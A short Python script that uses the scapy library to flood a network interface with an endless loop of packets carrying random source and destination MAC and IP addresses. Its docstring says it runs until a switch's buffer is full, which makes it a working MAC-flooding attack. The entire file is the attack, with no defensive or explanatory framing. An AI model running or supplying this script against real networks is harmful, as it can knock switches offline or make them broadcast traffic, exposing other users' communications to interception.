#!/usr/bin/python3

"""
Generates random MAC addresses and sends them to a switch until the
buffer is full.
"""

import sys
from scapy.all import *

# Generate random MAC and IP address for source and destination
packet = Ether(src=RandMAC("*:*:*:*:*:*"),
               dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"),
            dst=RandIP("*.*.*.*")) / \
         ICMP()

if len (sys.argv) < 2:
    dev = "enp1s0"
else:
    dev = sys.argv[1]

print("Flooding net with random packets on dev " + dev)


# Loop send
sendp(packet, iface=dev, loop =1)